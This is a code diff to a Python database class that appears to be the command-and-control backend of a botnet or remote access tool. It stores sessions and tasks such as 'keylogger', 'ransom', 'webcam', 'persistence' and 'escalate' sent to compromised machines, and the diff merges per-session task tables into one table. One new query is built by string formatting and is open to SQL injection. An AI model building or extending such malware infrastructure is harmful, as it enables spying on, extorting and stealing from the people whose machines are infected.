@@ -21,9 +21,10 @@ class Database(sqlite3.Connection):
 
     """
     _tbl_tasks = """BEGIN TRANSACTION;
-CREATE TABLE IF NOT EXISTS '{}' (
+CREATE TABLE IF NOT EXISTS tbl_tasks (
     id serial, 
     uid varchar(32) NOT NULL, 
+    session varchar(32) NOT NULL,
     task text DEFAULT NULL, 
     result text DEFAULT NULL, 
     issued DATETIME DEFAULT NULL, 
@@ -65,6 +66,7 @@ COMMIT;
         self._database = database
         self._tasks = ['escalate','keylogger','outlook','packetsniffer','persistence','phone','portscan','process','ransom','screenshot','webcam']
         self.execute_file(sql=self._tbl_sessions, returns=False, display=False)
+        self.execute_file(sql=self._tbl_tasks, returns=False, display=False)
 
     def _display(self, data, indent=4):
         if isinstance(data, dict):
@@ -207,10 +209,10 @@ COMMIT;
         """
         tasks = []
         if session:
-            tasks.append(self.execute_query("select * from {}".format(session), returns=True, display=display))
+            tasks.append(self.execute_query("select * from tbl_tasks where session={}".format(session), returns=True, display=display))
         else:
             for row in self.get_sessions():
-                tasks.append(self.execute_query("select * from {}".format(row['uid']), returns=True, display=display))
+                tasks.append(self.execute_query("select * from tbl_tasks", returns=True, display=display))
         return tasks
 
     def handle_session(self, info):
@@ -237,7 +239,6 @@ COMMIT;
 
             if not self.exists(info['uid']):
         	    self.execute_query("insert into tbl_sessions ({}) values (:{})".format(','.join(info.keys()), ',:'.join(info.keys())), params=info, returns=False, display=False)
-        	    self.execute_file(sql=self._tbl_tasks.format(info['uid']), returns=False, display=False)
             else:
                 self.execute_query("update tbl_sessions set online=:online, sessions=:sessions, last_online=:last_online where uid=:uid", params=info, returns=False, display=False)
 
@@ -271,10 +272,12 @@ COMMIT;
             if 'uid' not in task:
                 task['uid'] = md5.new(task['session'] + task['task'] + datetime.datetime.now().ctime()).hexdigest()
                 task['issued'] = datetime.datetime.now()
-                self.execute_query('insert into {} values (:uid, :task, :issued)'.format(task['session']), params={"uid": task['uid'],  "task": task['task'], "issued": task['issued']}, returns=False)
+                self.execute_query('insert into tbl_tasks (uid, session, task, issued) values (:uid, :session, :task, :issued)', params={"uid": task['uid'],  "session": task['session'], "task": task['task'], "issued": task['issued']}, returns=False)
+                task['issued'] = task['issued'].ctime()
             else:
                 task['completed'] = datetime.datetime.now()
-                self.execute_query('update {} set result=:result, completed=:completed where uid=:uid'.format(task['session']), params={"result": task['result'], "completed": task['completed'], "uid": task['uid']}, returns=False)
+                self.execute_query('update tbl_tasks set result=:result, completed=:completed where uid=:uid', params={"result": task['result'], "completed": task['completed'], "uid": task['uid']}, returns=False)
+                task['completed'] = task['completed'].ctime()
             self.commit()
             return task
         else:
